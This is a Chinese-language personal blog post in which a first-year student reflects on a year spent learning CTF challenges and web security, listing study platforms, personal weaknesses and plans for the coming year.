刷刷手机，碌碌无为的什么都不想干；临近开学了，才如梦初醒般的悔悟，看了两本书，捣鼓了下手机，浅浅地了解了一下安卓的刷机和搞机的相关知识。\n三月底正式开学，四月初开始把“荒废”的ctf题继续捡起来，从之前的每周末做做题变成了每天晚上都拿出时间来学习。当时虽然对安全还是懵懂的认识，但是我的直觉告诉我这就是我的爱好，是能带来成就感和快乐的东西，我愿意花时间去琢磨它。也是四月，看了《网络是怎样连接的》《图解http》和《图解tcp/ip》，正式的了解了一下计网（虽然也只是个入门）；做完ctfhub的web部分之后，也算是对ctf里web部分的基本类型都见过了，开始在buuoj上真正做一些ctf的题。\n然而到真正到做ctf题的时候发现自己又是那样的渺小，拿到一道题也只能抓包、扫目录，好一点的能拿到泄露的源码，可是到代码审计又是完全的稀烂，js不会看 php不会看 java更不会看，甚至连复杂一点的python也不会看，一个类型的题 稍微变个花样 拐个弯就又看不懂了，一副痛苦面具；现在回过头来看 很庆幸当时即使遇到了种种问题也没打退堂鼓，没见过的函数就去搜文档 看用法，没见过的知识点就去搜相关资料，看不懂的题就多看几个不同的wp 然后复现 用自己的话再整理出来 打好tag放到notion上。\n很快到了五月，五月初把老旧厚重的电脑换掉了，新上手的装备提升了不少学习的舒适感；这段时间也夹杂着做了一点burpsuite portswigger的题（这块做的不太扎实，而且当时做的时候没有用图床 笔记里的图片也都丢掉了 之后得回过头来重新看看），也夹杂做了几个单独类型的靶场；然后是两周难熬的军训。虽然军训难熬，但是过的真的很快乐。这里就是懂的都懂了，不详说。开心快乐的几个月，我将永远铭记。\n军训回来以后就六月了，算是进入正轨？不知道这样说是不是很合适，对很多题目也是一回生 二回熟，从一开始的完全不知道从哪里下手到稍微能分析一点（虽然还是不能脱离wp独自行走），可能对于一些有天赋的大佬来说这些轻轻松松，我可能花几个小时能搞懂的东西只需要别人一个小时能理解透，但是我已经很满意了，那句话怎么说？“进一寸有一寸的欢喜”，或许就是这样吧，虽然每天是笨拙地学着，但也开心。\n也是六月之后，开始关注漏洞、渗透、攻防等等安全方面核心向的一些东西，开始每天抽出时间看安全类的公众号文章，一开始只是不明觉厉——哇 虽然看不懂是在干什么 但是好nb 好厉害，看的多了一点以后开始慢慢明白那些高大上的名词是什么意思，原来网络安全的世界是那么让人着迷。也开始正式接触ctf比赛（虽然也就是进去签个到的水平……），开始做vulnhub的靶机，开始复盘之前做过的题，慢慢的 旁征博引 一点点的丰富知识体系。\n现在已经是7月中旬了，很快就要从大一的菜鸡变为大二的菜鸡了，回顾这一年的学习和生活也是感慨良多。满打满算，接触安全是不到四个月吧，算是也不短了，可是认真捋一下整个的过程 又是漏洞百出——代码审计能力稀烂，经常分析不出来问题所在的地方；逻辑链条一长的题目就思维呆滞 总是会下意识地想放弃 这真的不是个好现象；sqli和upload类的题做了不少，但还是不能自己独立的 完全不参考别人的wp完成一整个分析过程；对于python的掌握不够好，明显反应在任何需要编写py脚本的题目上；对一些知识点——不说一些了，可以说是全部的东西的了解和认识都还是浅尝辄止，停留在纸面上的花架子，比如反序列化 比如目录遍历，脑子里只能说有个残存的印象 可真正给我个这样的题 还是不能说轻松上手，甚至是对一些概念还理不清楚，学的东西可能看起来是有个样子 但我心里清楚 差的还太远太远，甚至完全没有到能自信的跟别人说“我在学ctf 我在学安全”的程度。\n学不动的时候经常会看大佬的博客，看看别人的学习经历是什么样的。之前还会拿年龄做自我开脱的借口，还小，还早，还都来得及，可是越学 越发现要去点亮的技能树越是枝繁叶茂，厚厚的树冠仿佛要遮天蔽日般——要学java 提高代码审计能力 常见的漏洞类型要做到心里有数，要把之前做过的题多温习 多想多练多看，要做到真正的掌握知识 而不是记住这个东西叫什么 徒有其表，要多写写代码 写代码的基本功太差那肯定是走不远，最感兴趣的渗透和漏洞方面的东西更要多看 可以本地复现的不要懒；即便如此，也有不少阳光能够穿透树叶交叠之处，温暖的洒落。可能我真的不是所谓的天赋型选手，只不过是万千平平无奇的普通人之一，学习能力也就是个中等水平，但是我相信量变引起质变，相信持之以恒的努力会带来改变，更何况这还是我非常喜欢的事情；可能我即使努力四年 也达不到那些大佬半年就能达到的高度，但是不重要 学习嘛 就是不会才要学，就算学不会也不是什么丢人的事情，日拱一卒，功不唐捐。\n再一抬眼，暑假就要来了。要干的和要学的很多，千头万绪的；但也算是有明确的方向，人还是忙起来好。下学期就大二了，再一晃就大三了，自己是不想考研的，但是到了大四 自己的实力够进大厂吗？会不会毕业即失业？我不知道，但谁又知道呢？未来的事情预测不了，能做的只有把握当下。\n大一就要结束了，在图书馆常坐的座位上，打开typora，草草的复盘了一下整个一学年。上一次写复盘总结还是六月初 刚军训完，一个有点迷茫的时候。如果跟0基础的自己比起来，可以说是成长了不少；但我知道这还远远达不到平均线，差的还太多，是完全拿不出手的程度。但总的来说，还算有一点点小小的收获，希望自己在之后的日子里也能坚守住初心，保持对安全的热爱，保持学习的热情，也保持对美好生活的热忱；希望能够变得越来越强大；希望大二的寒假写复盘总结的时候能有更多可写的 更多开心的事情。\n：）\n","date":"2021-07-22T18:27:39+08:00","permalink":"https://amiaaaz.github.io/life/0920-0721-summary/","section":"life","tags":[],"title":"一点小小的总结（"}]